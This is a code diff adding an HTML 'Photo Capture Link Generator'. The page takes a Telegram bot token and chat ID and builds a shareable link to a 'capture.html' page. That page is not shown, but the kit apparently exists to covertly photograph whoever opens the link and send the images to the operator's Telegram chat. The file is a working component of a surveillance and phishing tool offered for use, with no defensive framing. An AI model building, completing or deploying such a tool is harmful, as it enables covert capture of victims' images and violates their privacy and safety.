@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo Capture Link Generator</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial, sans-serif; display:flex; flex-direction:column; align-items:center; margin:40px;}
+        .container{max-width:350px;width:100%;border:1px solid #ddd;padding:24px;border-radius:8px;}
+        input,button{margin-top:10px;padding:10px;width:100%;box-sizing:border-box;}
+        #result{margin-top:20px;word-break:break-all;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Make Your Capture Link</h2>
+        <input type="text" id="token" placeholder="Telegram Bot Token" required>
+        <input type="text" id="chatid" placeholder="Telegram Chat ID" required>
+        <button onclick="generate()">Generate Link</button>
+        <div id="result"></div>
+    </div>
+    <script>
+        function generate() {
+            const token = encodeURIComponent(document.getElementById('token').value.trim());
+            const chat = encodeURIComponent(document.getElementById('chatid').value.trim());
+            if (!token || !chat) {
+                alert("Please Enter Both Token & Chat ID");
+                return;
+            }
+            // Change the base URL to your hosting address:
+            const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'capture.html';
+            const link = `${baseUrl}?token=${token}&chat=${chat}`;
+            document.getElementById('result').innerHTML = `<b>Your Link:</b><br><a href="${link}" target="_blank">${link}</a>`;
+        }
+    </script>
+</body>
+</html>
